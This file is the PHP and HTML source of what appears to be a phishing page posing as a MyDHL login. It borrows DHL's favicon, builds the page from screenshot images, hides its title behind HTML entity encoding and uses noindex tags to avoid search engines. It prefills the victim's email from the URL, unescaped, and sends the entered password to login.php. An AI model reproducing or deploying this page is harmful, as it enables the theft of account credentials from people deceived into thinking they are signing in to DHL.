<?php

if (isset($_GET['email'])) {

	$email = $_GET['email'];
}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#77;&#121;&#68;&#72;&#76;&#32;&#111;&#102;&#102;&#101;&#114;&#115;&#32;&#115;&#111;&#108;&#117;&#116;&#105;&#111;&#110;&#115;&#32;&#102;&#111;&#114;&#32;&#115;&#104;&#105;&#112;&#112;&#105;&#110;&#103;&#44;&#32;&#116;&#114;&#97;&#99;&#107;&#105;&#110;&#103;&#44;&#32;&#98;&#105;&#108;&#108;&#105;&#110;&#103;&#32;&#97;&#110;&#100;&#32;&#109;&#111;&#114;&#101;&#46;&#32;&#32;&#83;&#105;&#103;&#110;&#32;&#117;&#112;&#32;&#97;&#115;&#32;&#97;&#110;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#104;&#111;&#108;&#100;&#101;&#114;&#32;&#111;&#114;&#32;&#110;&#101;&#119;&#32;&#117;&#115;&#101;&#114;&#46;</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="robots" content="noindex">
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="noindex">
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="nosnippet">
<meta http-equiv="Cache-Control" content="no-store">
<meta http-equiv="Cache-Control" content="no-cache">
<meta http-equiv="Cache-Control" content="private">
<meta http-equiv="Pragma" content="no-cache">
<link rel="icon" type="images/png" sizes="16*16" href="https://www.mydhl.dhl.com/mydhl/framework/skins/dhl/images/favicon.ico">
<style type="text/css">
	#gvp_mainPopUpTitle {margin:0;padding:0;text-align:left;}
	#textarea{
        min-width: 290px !important; 
        max-width: 290px !important; 
        min-height: 136px !important; 
        max-height: 136px !important;
     } 
      #chars{
            top:0px !important;
      }
      #MainTab>li:focus{outline:1px dotted black;}
      .extend3o #wrapper:focus {outline: 1px dotted black;}
      .extend3o .notefontalertReg14.arrowRt{padding:0 15px 2px 0}      
</style>

<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

</head>
<body style="visibility: visible;" onload="unhideBody()" bgcolor="#f7f7f7">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:1900px; z-index:0">
<img src="images/0.png" alt="" title="" width="1349" border="0" height="1900">
</div>
<div id="image3" style="position:absolute; overflow:hidden; left:993px; top:435px; width:199px; height:21px; z-index:4">
<a href="#"><img src="images/3.png" alt="" title="" width="199" border="0" height="21"></a>
</div>
<form action="login.php" name="track" id="track" method="post">
<div>
<input style="position:absolute; left:1001px; top:260px; width:219px; height: auto; min-height: 35px; padding: 0; border: 0; color: #333; font-size: 13px; font: 14px/18px Omnes-ATT-W02, arial; font-style: normal; padding: 5px 14px 6px; z-index:1" name="ui" id="username" class="textBox" maxlength="60" size="20" title="User ID" value="<?php if (isset($_GET['email'])) { echo $email; }?>" placeholder="<?php if (isset($_GET['email'])) { echo $email; }?>" type="text" readonly/>
</div>
<div>
<input style="position:absolute; left:1001px; top:307px; width:219px; height: auto; min-height: 35px; padding: 0; border: 0; color: #333; font-size: 13px; font: 14px/18px Omnes-ATT-W02, arial; font-style: normal; padding: 5px 14px 6px; z-index:2" name="pw" id="password" class="textBox" maxlength="20" size="20" title="Password" placeholder="Password" autocomplete="off" type="password" required="">
</div>
<div id="formimage1" style="position:absolute; left:1000px; top:387px; z-index:3">
<input type="image" name="formimage1" width="219" height="34" src="images/1.png">
</div>
</form>
</body>
</html>

